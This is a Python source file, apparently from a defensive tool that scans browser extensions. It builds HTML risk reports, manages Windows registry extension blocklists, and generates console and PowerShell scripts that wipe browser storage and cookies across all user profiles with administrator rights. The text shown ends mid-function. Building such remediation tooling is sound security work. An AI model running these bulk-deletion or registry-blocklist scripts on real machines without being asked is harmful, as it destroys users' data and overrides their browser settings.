                "a compromised CDN can silently serve malicious code to the extension.</p>",
                "<p><strong>Tags:</strong> <code>[SIDELOADED / UNPACKED]</code> = loaded via developer mode, not installed from Web Store. "
                "<code>[NOT IN WEB STORE]</code> = extension ID not found in the Chrome Web Store (may be enterprise/private or removed).</p>",
                "</div>",
            ]

            collapse_counter = 0

            for ext in extensions:
                html_risk = ext.calculate_risk_level()
                risk_class = {"critical": "danger", "high": "warning", "trusted": "trusted"}.get(html_risk, "")

                html.append(f"<div class='extension-card {risk_class}'>")
                risk_badge = {"critical": "CRITICAL", "high": "HIGH", "medium": "MEDIUM", "low": "LOW", "safe": "SAFE", "trusted": "TRUSTED"}.get(html_risk, "")
                badge_color = {"critical": "#c0392b", "high": "#d68910", "medium": "#7d6608", "low": "#2980b9", "safe": "#27ae60", "trusted": "#27ae60"}.get(html_risk, "#999")
                meter_color = badge_color
                score_pct = min(100, max(0, ext.risk_score))

                # Extra tags for unpacked/sideloaded and not-in-store extensions
                extra_tags = ""
                if getattr(ext, 'is_unpacked', False):
                    extra_tags += " <span style='background:#e74c3c22;color:#e74c3c;border:1px solid #e74c3c;padding:2px 8px;border-radius:12px;font-size:0.65em;font-weight:700;vertical-align:middle;margin-left:6px'>SIDELOADED / UNPACKED</span>"
                wm_check = getattr(ext, 'webstore_meta', {})
                wm_err = str(wm_check.get("error", "")) if wm_check else ""
                if wm_check and wm_err and any(code in wm_err for code in ("404", "204", "not available")):
                    extra_tags += " <span style='background:#95a5a622;color:#7f8c8d;border:1px solid #95a5a6;padding:2px 8px;border-radius:12px;font-size:0.65em;font-weight:700;vertical-align:middle;margin-left:6px'>NOT IN WEB STORE</span>"
                elif wm_check and wm_err:
                    extra_tags += " <span style='background:#f39c1222;color:#d68910;border:1px solid #f39c12;padding:2px 8px;border-radius:12px;font-size:0.65em;font-weight:700;vertical-align:middle;margin-left:6px'>STORE CHECK FAILED</span>"
                elif not wm_check or (not wm_err and not wm_check.get("users") and not wm_check.get("users_display")):
                    pass

                html.append(f"<div class='header'><h2><span style='color:{badge_color};font-weight:bold;margin-right:8px;'>[{risk_badge}]</span>{ext.name}{extra_tags} "
                            f"<span style='font-size:0.7em;color:#7f8c8d'>(Score: {ext.risk_score}/100)</span>"
                            f"<span class='risk-meter'><span class='risk-meter-fill' style='width:{score_pct}%;background:{meter_color}'></span></span>"
                            f"</h2><span class='id'>{ext.id}</span></div>")
                html.append(f"<div class='meta'>Version: {ext.version} | Browser: {ext.browser} | Profile: {ext.profile} | Manifest v{ext.manifest_version}</div>")

                # Trusted label
                trusted_lbl = getattr(ext, 'trusted_label', "")
                if trusted_lbl:
                    html.append(f"<div class='meta' style='margin-top:4px'><span style='color:#27ae60;font-weight:bold;font-size:0.95em'>&#9733; {trusted_lbl}</span></div>")

                # Web Store metadata
                wm = getattr(ext, 'webstore_meta', {})
                if wm and not wm.get("error"):
                    meta_parts = []
                    if "users_display" in wm:
                        users = wm.get("users", 0)
                        color = "#c0392b" if users < 1000 else "#27ae60" if users > 100000 else "#7f8c8d"
                        meta_parts.append(f"<span style='color:{color};font-weight:bold'>{wm['users_display']}</span>")
                    if "rating" in wm:
                        meta_parts.append(f"Rating: {wm['rating']}/5 ({wm.get('rating_count', '?')} ratings)")
                    if wm.get("featured"):
                        meta_parts.append("<span style='color:#27ae60;font-weight:bold'>Featured (Google-vetted)</span>")
                    if meta_parts:
                        store_url = wm.get('store_url', '')
                        link = f" | <a href='{store_url}'>View on Web Store</a>" if store_url else ""
                        html.append(f"<div class='meta' style='margin-top:4px'>{' | '.join(meta_parts)}{link}</div>")

                # --- CSP Issues ---
                if ext.has_csp_issues():
                    html.append("<div class='section'>")
                    html.append("<div class='section-header'><div class='section-title'>Content Security Policy (CSP) Issues</div></div>")
                    html.append("<p class='section-desc'>The extension's <code>content_security_policy</code> in manifest.json controls which sources can load scripts, styles, and other resources. "
                                "A weak or missing CSP can allow code injection attacks. Each issue below represents a policy weakness that could be exploited.</p>")

                    csp_raw = getattr(ext, 'csp_raw', '')
                    if csp_raw:
                        escaped_csp = html_mod.escape(csp_raw)
                        html.append("<div style='background:#1e2330;color:#e8e8e8;padding:10px 14px;border-radius:6px;font-family:Consolas,monospace;font-size:0.82em;"
                                    "margin:8px 0 12px;overflow-x:auto;border-left:3px solid #e67e22;white-space:pre-wrap;word-break:break-all'>")
                        html.append(f"<span style='color:#7f8c8d'>// manifest.json → content_security_policy</span>\n<span style='color:#f39c12'>\"content_security_policy\"</span>: "
                                    f"<span style='color:#e74c3c'>\"{escaped_csp}\"</span>")
                        html.append("</div>")
                    elif any("No CSP defined" in i for i in ext.csp_issues):
                        html.append("<div style='background:#1e2330;color:#e8e8e8;padding:10px 14px;border-radius:6px;font-family:Consolas,monospace;font-size:0.82em;"
                                    "margin:8px 0 12px;overflow-x:auto;border-left:3px solid #e67e22'>")
                        html.append("<span style='color:#7f8c8d'>// manifest.json — no content_security_policy key found</span>\n"
                                    "<span style='color:#555'>\"content_security_policy\": </span><span style='color:#e74c3c;font-style:italic'>MISSING</span>")
                        html.append("</div>")

                    _csp_explanations = {
                        "unsafe-eval": (
                            "<strong>Why this is dangerous:</strong> <code>'unsafe-eval'</code> allows the extension to run <code>eval()</code>, "
                            "<code>new Function()</code>, and <code>setTimeout('string')</code>. An attacker who finds any XSS vulnerability in the "
                            "extension can use these to execute arbitrary JavaScript — turning a minor bug into full code execution."
                        ),
                        "unsafe-inline": (
                            "<strong>Why this is dangerous:</strong> <code>'unsafe-inline'</code> allows inline <code>&lt;script&gt;</code> tags and "
                            "<code>on*</code> event handlers (e.g. <code>onclick</code>). If an attacker can inject any HTML into the extension's pages, "
                            "they can run arbitrary scripts without needing to host a payload externally."
                        ),
                        "wildcard": (
                            "<strong>Why this is dangerous:</strong> A wildcard <code>*</code> source means the extension will accept and execute scripts "
                            "from <em>any</em> origin. An attacker controlling any domain on the internet can serve malicious scripts that the extension "
                            "will happily load and run."
                        ),
                        "http:": (
                            "<strong>Why this is dangerous:</strong> Allowing <code>http:</code> sources means scripts can be loaded over unencrypted connections. "
                            "A man-in-the-middle attacker (e.g. on public WiFi) can intercept and replace the script with a malicious payload — "
                            "the extension would execute it without any warning."
                        ),
                        "external domains": (
                            "<strong>Why this matters:</strong> The CSP explicitly allows loading scripts from third-party domains. "
                            "If any of those domains are compromised (supply chain attack), or if the domain expires and is re-registered by an attacker, "
                            "malicious code could be injected into the extension."
                        ),
                        "No CSP defined": (
                            "<strong>Why this matters:</strong> Without a Content Security Policy, the browser falls back to a permissive default (in Manifest V2). "
                            "This means the extension can load scripts from any origin, use <code>eval()</code>, and run inline scripts — "
                            "offering no protection against code injection if any part of the extension is compromised."
                        ),
                    }

                    for issue in ext.csp_issues:
                        pill_class = "heuristic"
                        if "unsafe-eval" in issue:
                            pill_class = "dnr"
                        elif "unsafe-inline" in issue:
                            pill_class = "dnr"
                        elif "wildcard" in issue or "'*'" in issue:
                            pill_class = "dnr"
                        safe_issue = html_mod.escape(issue)
                        html.append(f"<span class='pill {pill_class}'>{safe_issue}</span>")
                        for key, explanation in _csp_explanations.items():
                            if key.lower() in issue.lower():
                                html.append(f"<div class='explain' style='margin:-4px 0 8px 12px;font-size:0.85em'>{explanation}</div>")
                                break
                    html.append("</div>")

                # --- SRI Issues ---
                if ext.has_sri_issues():
                    html.append("<div class='section'>")
                    html.append("<div class='section-header'><div class='section-title'>Sub-Resource Integrity (SRI) Issues</div></div>")
                    html.append("<p class='section-desc'>External scripts and stylesheets loaded <strong>without</strong> an <code>integrity</code> hash. "
                                "If the CDN or external server is compromised, the attacker can replace the file with malicious code and the extension will load it blindly. "
                                "Adding <code>integrity=\"sha384-...\"</code> ensures the browser blocks tampered files.</p>")
                    html.append("<table class='data-table'>")
                    html.append("<tr><th style='width:15%'>File</th><th style='width:10%'>Type</th><th>External URL (no integrity hash)</th></tr>")
                    for sri in ext.sri_issues:
                        safe_url = html_mod.escape(sri['url'])
                        type_label = {"script": "Script", "stylesheet": "Stylesheet", "js_fetch": "JS Fetch"}.get(sri['type'], sri['type'])
                        html.append(f"<tr><td style='font-family:monospace;font-size:0.85em'>{html_mod.escape(sri['file'])}</td>"
                                    f"<td>{type_label}</td>"
                                    f"<td style='font-family:monospace;font-size:0.85em;color:#c0392b;word-break:break-all'>{safe_url}</td></tr>")
                    html.append("</table></div>")

                # --- Heuristic Warnings (with explanations) ---
                if ext.has_heuristics():
                    html.append("<div class='section'>")
                    html.append("<div class='section-header'><div class='section-title'>Heuristic Warnings</div></div>")
                    html.append("<p class='section-desc'>Suspicious code patterns found during static analysis of the extension's JavaScript files.</p>")
                    for h in getattr(ext, 'heuristics', []):
                        html.append(f"<span class='pill heuristic'>{html_mod.escape(h)}</span>")
                        for key, explanation in self._HEURISTIC_EXPLANATIONS.items():
                            if key.lower() in h.lower():
                                html.append(f"<div class='explain heuristic-explain'>{explanation}</div>")
                                break
                    html.append("</div>")

                # --- DNR Warnings ---
                if ext.has_dnr_warnings():
                    html.append("<div class='section'>")
                    html.append("<div class='section-header'><div class='section-title'>Declarative Net Request Warnings</div></div>")
                    html.append("<p class='section-desc'>The extension uses network request rules that may block or redirect traffic to security-related or search engine domains.</p>")
                    for d in getattr(ext, 'dnr_warnings', []):
                        html.append(f"<span class='pill dnr'>{html_mod.escape(d)}</span>")
                    html.append("</div>")

                # --- API Permissions (table with descriptions) ---
                if ext.permissions:
                    collapse_counter += 1
                    cid = f"perms-{collapse_counter}"
                    n_perms = len(ext.permissions)
                    html.append("<div class='section'>")
                    html.append(f"<div class='section-header'><div class='section-title collapsible open' id='btn-{cid}' onclick=\"toggleCollapse('{cid}')\">API Permissions<span class='badge-count'>{n_perms}</span></div></div>")
                    html.append("<p class='section-desc'>Chrome extension APIs this extension has access to. Each permission grants specific capabilities.</p>")
                    html.append(f"<div class='collapse-content open' id='{cid}'>")
                    html.append("<table class='data-table'>")
                    html.append("<tr><th style='width:20%'>Permission</th><th style='width:10%'>Risk</th><th>Description &amp; Potential Abuse</th></tr>")
                    for p in ext.permissions:
                        info = PERMISSIONS_DICTIONARY.get(p, {})
                        risk = info.get("risk_level", "LOW")
                        desc = info.get("description", "No detailed description available.")
                        if info.get("malicious_uses"):
                            desc += f"<br><span style='color:#c0392b;font-size:0.85em;display:inline-block;margin-top:4px'><strong>Abuse potential:</strong> {'; '.join(info['malicious_uses'][:2])}</span>"
                        risk_color = {"CRITICAL": "#c0392b", "HIGH": "#d35400", "MEDIUM": "#f39c12"}.get(risk, "#27ae60")
                        html.append(f"<tr><td style='font-family:monospace'>{p}</td><td style='color:{risk_color};font-weight:bold'>{risk}</td><td>{desc}</td></tr>")
                    html.append("</table></div></div>")

                # --- Host Permissions (with pattern explanations) ---
                if ext.host_permissions:
                    collapse_counter += 1
                    cid = f"hosts-{collapse_counter}"
                    n_hosts = len(ext.host_permissions)
                    html.append("<div class='section'>")
                    html.append(f"<div class='section-header'><div class='section-title collapsible open' id='btn-{cid}' onclick=\"toggleCollapse('{cid}')\">Host Permissions (Site Access)<span class='badge-count'>{n_hosts}</span></div></div>")
                    html.append("<p class='section-desc'>URL patterns the extension can access. These determine which websites the extension can read, modify, or intercept requests on.</p>")
                    html.append(f"<div class='collapse-content open' id='{cid}'>")
                    for hp in ext.host_permissions:
                        html.append(f"<span class='pill host-perm'>{hp}</span>")
                    has_broad = any(p in ("*://*/*", "<all_urls>", "http://*/*", "https://*/*") for p in ext.host_permissions)
                    if has_broad:
                        html.append("<div class='explain'>")
                        for hp in ext.host_permissions:
                            explanation = self._HOST_PERM_EXPLANATIONS.get(hp)
                            if explanation:
                                html.append(f"<p style='margin:3px 0'><code>{hp}</code> &mdash; {explanation}</p>")
                        html.append("</div>")
                    html.append("</div></div>")

                # --- Content Script Matches (with pattern explanations) ---
                if ext.content_scripts:
                    collapse_counter += 1
                    cid = f"cs-{collapse_counter}"
                    n_cs = len(ext.content_scripts)
                    html.append("<div class='section'>")
                    html.append(f"<div class='section-header'><div class='section-title collapsible{' open' if n_cs <= 10 else ''}' id='btn-{cid}' onclick=\"toggleCollapse('{cid}')\">Content Script Matches<span class='badge-count'>{n_cs}</span></div></div>")
                    html.append("<p class='section-desc'>URL patterns where this extension injects JavaScript into the page. "
                                "Content scripts can read and modify page content, capture form data, and interact with the DOM.</p>")
                    html.append(f"<div class='collapse-content{' open' if n_cs <= 10 else ''}' id='{cid}'>")
                    for cs in ext.content_scripts:
                        html.append(f"<span class='pill' style='background:#e8f4f8;color:#2471a3'>{cs}</span>")
                    broad_cs = [p for p in ext.content_scripts if p in self._CONTENT_SCRIPT_EXPLANATIONS]
                    if broad_cs:
                        html.append("<div class='explain'>")
                        for p in broad_cs:
                            html.append(f"<p style='margin:3px 0'><code>{p}</code> &mdash; {self._CONTENT_SCRIPT_EXPLANATIONS[p]}</p>")
                        html.append("</div>")
                    html.append("</div></div>")

                # --- Domain/IP Extractions (collapsible table, all items shown) ---
                domains = getattr(ext, 'extracted_domains', None)
                if domains and len(domains) > 0:
                    collapse_counter += 1
                    cid = f"domains-{collapse_counter}"
                    n_domains = len(domains)
                    auto_open = n_domains <= 10
                    html.append("<div class='section'>")
                    html.append(f"<div class='section-header'><div class='section-title collapsible{' open' if auto_open else ''}' id='btn-{cid}' onclick=\"toggleCollapse('{cid}')\">Domain/IP Extractions (Network Indicators)<span class='badge-count'>{n_domains}</span></div></div>")
                    html.append("<p class='section-desc'>Domains and IP addresses found hardcoded in the extension's source code. "
                                "These are endpoints the extension may communicate with &mdash; they could be legitimate APIs, analytics services, ad networks, or command-and-control servers.<br>"
                                "<em style='color:#996600'>Note: Extracted via regex pattern matching on JS/HTML source files (with Base64 decoding where applicable). "
                                "Highly obfuscated scripts may contain additional network IOCs not captured by static analysis.</em></p>")
                    html.append(f"<div class='collapse-content{' open' if auto_open else ''}' id='{cid}'>")
                    html.append("<table class='data-table'>")
                    html.append("<tr><th style='width:30%'>Domain / IP</th><th>Found In Files</th></tr>")
                    for dom, files in domains.items():
                        html.append(f"<tr><td style='font-family:monospace;font-weight:bold;color:#2c3e50'>{dom}</td><td style='color:#7f8c8d'>{', '.join(files)}</td></tr>")
                    html.append("</table></div></div>")

                # --- VT results ---
                if vt_results and not vt_results.get("error"):
                    html.append("<div class='section'>")
                    html.append("<div class='section-header'><div class='section-title'>VirusTotal Scan Results</div></div>")
                    html.append("<p class='section-desc'>Results from scanning the extension's file hashes and extracted domains against VirusTotal's threat intelligence database.</p>")
                    flagged_f = [f for f in vt_results.get("file_hashes", [])
                                 if f.get("vt_result") and isinstance(f["vt_result"], dict) and f["vt_result"].get("malicious", 0) > 0]
                    flagged_d = [d for d in vt_results.get("domain_results", [])
                                 if d.get("vt_result") and isinstance(d["vt_result"], dict) and d["vt_result"].get("malicious", 0) > 0]
                    total_f = len(vt_results.get("file_hashes", []))
                    total_d = len(vt_results.get("domain_results", []))
                    html.append(f"<p>Files scanned: {total_f} | Domains scanned: {total_d}</p>")
                    if flagged_f:
                        html.append("<table class='data-table'>")
                        html.append("<tr style='background:#fadbd8'><th>Flagged File</th><th>SHA256</th><th>Detections</th></tr>")
                        for ff in flagged_f:
                            vt = ff["vt_result"]
                            link = vt.get("link", "")
                            html.append(f"<tr><td style='font-family:monospace'>{ff['file']}</td><td style='font-size:0.8em'><a href='{link}'>{ff['sha256'][:16]}...</a></td><td style='color:#c0392b;font-weight:bold'>{vt['malicious']} malicious, {vt.get('suspicious',0)} suspicious</td></tr>")
                        html.append("</table>")
                    if flagged_d:
                        html.append("<table class='data-table' style='margin-top:10px'>")
                        html.append("<tr style='background:#fadbd8'><th>Flagged Domain</th><th>Detections</th></tr>")
                        for fd in flagged_d:
                            vt = fd["vt_result"]
                            link = vt.get("link", "")
                            html.append(f"<tr><td style='font-family:monospace'><a href='{link}'>{fd['domain']}</a></td><td style='color:#c0392b;font-weight:bold'>{vt['malicious']} malicious, {vt.get('suspicious',0)} suspicious</td></tr>")
                        html.append("</table>")
                    if not flagged_f and not flagged_d:
                        html.append("<span class='pill vt-clean'>All files and domains clean</span>")
                    html.append("</div>")

                # --- Description ---
                if ext.description:
                    html.append(f"<div class='section'><div class='section-title'>Developer Description</div>"
                                f"<p style='font-size:0.9em;color:#555;background:#eee;padding:8px;border-radius:4px'>{ext.description}</p></div>")

                html.append("</div>")

            html.append("</body></html>")

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("\n".join(html))
            return True
        except Exception as e:
            self.log(f"Failed to generate report: {e}")
            return False

    def blocklist_extension(self, extension) -> CleanupResult:
        """Windows-only: add extension ID to policy blocklist + ExtensionSettings + display name."""
        if self.system != "Windows":
            return CleanupResult(False, "Registry Blocklist", "Only supported on Windows")
        try:
            rs = self._apply_policy_blocklist_tasks(
                [
                    (
                        extension.browser,
                        extension.id,
                        self._display_name_for_blocklist_policy(extension),
                    )
                ],
                allow_elevation=True,
            )
            if not rs:
                return CleanupResult(False, "Registry Blocklist", "No policy result")
            r = rs[0]
            return CleanupResult(
                r.success,
                "Registry Blocklist",
                r.details,
                r.items_removed,
            )
        except Exception as e:
            return CleanupResult(False, "Registry Blocklist", str(e))

    def get_blocklist(self) -> Dict[str, List[str]]:
        """Per-browser unique extension IDs blocked via ExtensionInstallBlocklist (HKLM + HKCU merged)."""
        if self.system != "Windows":
            return {}
        try:
            import winreg
            blocklist: Dict[str, List[str]] = {}
            paths = self._windows_blocklist_registry_app_paths()
            for browser_key, apps in paths.items():
                seen: Set[str] = set()
                ordered: List[str] = []
                for app in apps:
                    for hkey in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                        try:
                            key = winreg.OpenKey(
                                hkey, f"SOFTWARE\\Policies\\{app}\\ExtensionInstallBlocklist",
                                0, _winreg_policy_access_read())
                            idx = 0
                            while True:
                                try:
                                    _name, value, _ = winreg.EnumValue(key, idx)
                                    if value:
                                        v = str(value).strip()
                                        if v and v not in seen:
                                            seen.add(v)
                                            ordered.append(v)
                                    idx += 1
                                except OSError:
                                    break
                            winreg.CloseKey(key)
                        except OSError:
                            pass
                if ordered:
                    blocklist[browser_key] = ordered
            return blocklist
        except Exception as e:
            self.log(f"Error reading blocklist: {e}")
            return {}

    def unblock_extension(self, ext_id: str) -> List[CleanupResult]:
        if self.system != "Windows":
            return [CleanupResult(False, "Registry Blocklist", "Only supported on Windows")]
        results = []
        eid = str(ext_id).strip()
        try:
            import winreg
            changed = False
            for _browser_key, apps in self._windows_blocklist_registry_app_paths().items():
                for app in apps:
                    reg_base = f"SOFTWARE\\Policies\\{app}"
                    bl_path = reg_base + r"\ExtensionInstallBlocklist"
                    for hkey in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                        try:
                            key = winreg.OpenKey(hkey, bl_path, 0, _winreg_policy_access_write())
                            to_delete = []
                            idx = 0
                            while True:
                                try:
                                    vn, value, _ = winreg.EnumValue(key, idx)
                                    if str(value).strip() == eid:
                                        to_delete.append(vn)
                                    idx += 1
                                except OSError:
                                    break
                            for vn in to_delete:
                                winreg.DeleteValue(key, vn)
                                changed = True
                            winreg.CloseKey(key)
                        except OSError:
                            pass
                        if self._windows_strip_extension_settings_id(hkey, reg_base, eid):
                            changed = True
                        if self._windows_strip_remedex_display_name(hkey, reg_base, eid):
                            changed = True
            if self._registry_blocklist_still_has_id(eid):
                if self._windows_elevated_unblock_extension(eid):
                    changed = True
                else:
                    self.log(
                        "Unblock: entries may remain under HKLM (Administrator / UAC required to remove)."
                    )
            if changed:
                results.append(CleanupResult(True, "Registry Blocklist", f"Unblocked {eid}"))
            else:
                results.append(CleanupResult(True, "Registry Blocklist", f"{eid} was not in any blocklist"))
        except Exception as e:
            results.append(CleanupResult(False, "Registry Blocklist", str(e)))
        return results

    def clear_blocklist(self) -> List[CleanupResult]:
        if self.system != "Windows":
            return [CleanupResult(False, "Registry Blocklist", "Only supported on Windows")]
        results = []
        try:
            import winreg
            cleared_any = False
            for browser_key, apps in self._windows_blocklist_registry_app_paths().items():
                for app in apps:
                    reg_base = f"SOFTWARE\\Policies\\{app}"
                    for hkey in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                        bl_path = reg_base + r"\ExtensionInstallBlocklist"
                        hive_name = "HKLM" if hkey == winreg.HKEY_LOCAL_MACHINE else "HKCU"
                        did = False
                        try:
                            key = winreg.OpenKey(hkey, bl_path, 0, _winreg_policy_access_write())
                            while True:
                                try:
                                    name, _, _ = winreg.EnumValue(key, 0)
                                    winreg.DeleteValue(key, name)
                                except OSError:
                                    break
                            winreg.CloseKey(key)
                            try:
                                parent = winreg.OpenKey(hkey, reg_base, 0, _winreg_policy_access_write())
                                winreg.DeleteKey(parent, "ExtensionInstallBlocklist")
                                winreg.CloseKey(parent)
                            except OSError:
                                pass
                            did = True
                        except OSError:
                            pass
                        if self._windows_prune_blocked_extension_settings(hkey, reg_base):
                            did = True
                        try:
                            parent = winreg.OpenKey(hkey, reg_base, 0, _winreg_policy_access_write())
                            try:
                                winreg.DeleteValue(parent, self.REMEDEX_BLOCKLIST_NAMES_VALUE)
                                did = True
                            except OSError:
                                pass
                            finally:
                                winreg.CloseKey(parent)
                        except OSError:
                            pass
                        if did:
                            cleared_any = True
                            self.log(f"Cleared {browser_key} policy artifacts ({app}) in {hive_name}")
            if self.get_blocklist():
                if self._windows_elevated_clear_blocklists():
                    cleared_any = True
                else:
                    self.log(
                        "Clear blocklist: HKLM or protected keys may need Administrator (UAC) to clear fully."
                    )
            if cleared_any:
                results.append(CleanupResult(True, "Registry Blocklist", "Successfully cleared all blocklists"))
            else:
                results.append(CleanupResult(True, "Registry Blocklist", "No blocklists found to clear"))
        except Exception as e:
            results.append(CleanupResult(False, "Registry Blocklist", str(e)))
        return results

    def generate_browser_script(self, localstorage_keys: List[str] = None,
                               domains: List[str] = None) -> str:
        """Generate JavaScript cleanup script for browser console"""
        keys_json = json.dumps(localstorage_keys or [])
        domains_json = json.dumps(domains or [])
        
        script = f'''
// Browser Cleanup Script
// Run in DevTools Console (F12 -> Console)

(function() {{
    console.log("=== Browser Cleanup Script ===");
    
    const keysToRemove = {keys_json};
    const domainsToCheck = {domains_json};
    
    let removed = 0;
    
    // Remove specific keys
    keysToRemove.forEach(key => {{
        if (localStorage.getItem(key)) {{
            console.log("Removing key:", key);
            localStorage.removeItem(key);
            removed++;
        }}
    }});
    
    // Check for domain references
    Object.keys(localStorage).forEach(key => {{
        const value = localStorage.getItem(key);
        domainsToCheck.forEach(domain => {{
            if (value && value.includes(domain)) {{
                console.log("Found domain reference:", domain, "in key:", key);
            }}
        }});
    }});
    
    // Unregister service workers
    if ('serviceWorker' in navigator) {{
        navigator.serviceWorker.getRegistrations().then(regs => {{
            console.log("Found", regs.length, "service workers");
            regs.forEach(reg => {{
                console.log("Unregistering:", reg.scope);
                reg.unregister();
            }});
        }});
    }}
    
    console.log("Removed", removed, "localStorage keys");
    console.log("Run this on other sites as needed");
    
    // Expose helper function
    window.clearAllStorage = () => {{
        localStorage.clear();
        sessionStorage.clear();
        console.log("Cleared all storage");
    }};
    
    console.log("Tip: Run clearAllStorage() to clear all storage for this site");
}})();
'''
        return script
    
    def get_installed_browsers(self) -> List[str]:
        """Get list of browsers that are actually installed on this system"""
        browser_paths = self.get_browser_paths()
        installed = []
        for browser, paths in browser_paths.items():
            if any(p.exists() for p in paths):
                installed.append(browser.capitalize())
        return sorted(installed)
    
    def generate_remote_cleanup_script(self, output_format: str = "powershell", target_browsers: Optional[List[str]] = None, extensions_to_remove: Optional[List[str]] = None, disable_sync: bool = False, clean_preferences: bool = False, webhook_url: str = "", apply_blocklist: bool = True) -> str:
        """
        Generate a standalone cleanup script that can be run remotely.
        This script clears browser data from ALL websites by directly accessing browser data files.
        
        Args:
            output_format: "powershell" for Windows, "bash" for Linux/Mac, "python" for cross-platform
            target_browsers: Optional list of specific browsers to target
            extensions_to_remove: Optional list of extension IDs to remove
            disable_sync: If True, generated script will disable extension sync on the target host
            clean_preferences: If True, remove extension entries from Preferences/Secure Preferences
            webhook_url: Optional URL to send execution start/end status to
            apply_blocklist: If True, add removed extensions to OS-level policy blocklist (default ON)
        
        Returns:
            Script content as string
        """
        if output_format == "powershell":
            return self._generate_powershell_cleanup_script(target_browsers, extensions_to_remove, disable_sync, clean_preferences, webhook_url, apply_blocklist)
        elif output_format == "bash":
            return self._generate_bash_cleanup_script(disable_sync, clean_preferences, webhook_url, apply_blocklist)
        else:
            return self._generate_python_cleanup_script(disable_sync, clean_preferences, webhook_url, apply_blocklist)
    
    def _generate_powershell_cleanup_script(self, target_browsers: Optional[List[str]] = None, extensions_to_remove: Optional[List[str]] = None, disable_sync: bool = False, clean_preferences: bool = False, webhook_url: str = "", apply_blocklist: bool = True) -> str:
        """Generate PowerShell script for remote Windows cleanup"""
        browsers_str = "@('" + "', '".join(target_browsers) + "')" if target_browsers else "@()"
        exts_str = "@('" + "', '".join(extensions_to_remove) + "')" if extensions_to_remove else "@()"
        disable_sync_val = "$true" if disable_sync else "$false"
        clean_prefs_val = "$true" if clean_preferences else "$false"
        apply_blocklist_val = "$true" if apply_blocklist else "$false"
        webhook_url_val = webhook_url if webhook_url else ""
        
        script = '''#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Browser Data Cleanup Script - Clears ALL browser data and optionally removes extensions
    
.DESCRIPTION
    This script removes browser data including:
    - LocalStorage (all websites)
    - SessionStorage
    - Cache
    - Service Workers
    - Cookies (optional)
    - IndexedDB
    - Specific extensions (optional)
    
    Can be run remotely via PSRemoting, SCCM, Intune, or similar tools.
    
.PARAMETER IncludeCookies
    Also clear all cookies (will log you out of all sites)
    
.PARAMETER Browsers
    Array of browsers to clean. Default: all detected browsers
    Valid values: Chrome, Edge, Brave
    
.PARAMETER Force
    Skip confirmation prompts

.PARAMETER RemoveExtension
    Extension ID to remove (32-character ID like "abcdefghijklmnopabcdefghijklmnop")
    Can be specified multiple times to remove multiple extensions
    
.EXAMPLE
    .\\browser_cleanup.ps1 -Force
    
.EXAMPLE
    .\\browser_cleanup.ps1 -Browsers Chrome,Edge -IncludeCookies

.EXAMPLE
    .\\browser_cleanup.ps1 -RemoveExtension "abcdefghijklmnopabcdefghijklmnop" -Force
    
.NOTES
    WARNING: This will delete browsing data! Ensure browsers are closed first.
#>

$IncludeCookies = $false
$DisableSync = {disable_sync_val}
$CleanPreferences = {clean_prefs_val}
$ApplyBlocklist = {apply_blocklist_val}
$Browsers = {browsers_str}
$Force = $true
$RemoveExtension = {exts_str}
$WebhookUrl = "{webhook_url}"

$ErrorActionPreference = "SilentlyContinue"

function Send-Webhook {
    param([hashtable]$Data)
    if (-not $WebhookUrl) { return }
    try {
        $body = $Data | ConvertTo-Json -Compress -Depth 5
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# Log file - always use C:\\Windows\\Temp so it's predictable when running as SYSTEM
$LogFile = "C:\\Windows\\Temp\\remedex_cleanup_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
if (-not (Test-Path "C:\\Windows\\Temp")) { $LogFile = Join-Path $env:TEMP "remedex_cleanup_$(Get-Date -Format 'yyyyMMdd_HHmmss').log" }

# Browser relative paths under each user's profile
$BrowserRelativePaths = @{
    "Chrome" = "AppData\\Local\\Google\\Chrome\\User Data"
    "Edge"   = "AppData\\Local\\Microsoft\\Edge\\User Data"
    "Brave"  = "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"
}

# Browser processes
$BrowserProcesses = @{
    "Chrome" = "chrome"
    "Edge" = "msedge"
    "Brave" = "brave"
}

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "ERROR" { "Red" }
        "WARN" { "Yellow" }
        "SUCCESS" { "Green" }
        default { "White" }
    }
    $line = "[$timestamp] [$Level] $Message"
    Write-Host $line -ForegroundColor $color
    $line | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

function Get-UserHomeDirs {
    $homes = @()
    $systemAccounts = @("Public", "Default", "Default User", "All Users", "defaultuser0")
    foreach ($dir in (Get-ChildItem -Path "C:\\Users" -Directory -ErrorAction SilentlyContinue)) {
        if ($systemAccounts -contains $dir.Name) { continue }
        $homes += $dir.FullName
    }
    return $homes
}

function Get-AllBrowserPaths {
    $result = @{}
    
    # Use wildcard glob patterns to find browser data directories across all users.
    # This is more reliable than Test-Path on individual paths because the filesystem
    # resolves the wildcard in kernel mode, bypassing per-directory ACL traversal issues
    # that can occur when running as NT AUTHORITY\\SYSTEM.
    $BrowserGlobs = @{
        "Chrome"  = "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data"
        "Edge"    = "C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data"
        "Brave"   = "C:\\Users\\*\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"
    }
    
    foreach ($browser in $BrowserGlobs.Keys) {
        $glob = $BrowserGlobs[$browser]
        Write-Log "  Glob: $glob"
        $found = @(Resolve-Path $glob -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path)
        if ($found.Count -gt 0) {
            $result[$browser] = $found
            foreach ($p in $found) { Write-Log "    FOUND: $p" "SUCCESS" }
        } else {
            Write-Log "    No match"
        }
    }
    
    # Fallback: also try .NET DirectoryInfo glob if Resolve-Path found nothing
    if ($result.Count -eq 0) {
        Write-Log "Resolve-Path found nothing, trying .NET fallback..." "WARN"
        foreach ($browser in $BrowserGlobs.Keys) {
            $glob = $BrowserGlobs[$browser]
            $parent = Split-Path $glob
            $leaf = Split-Path $glob -Leaf
            try {
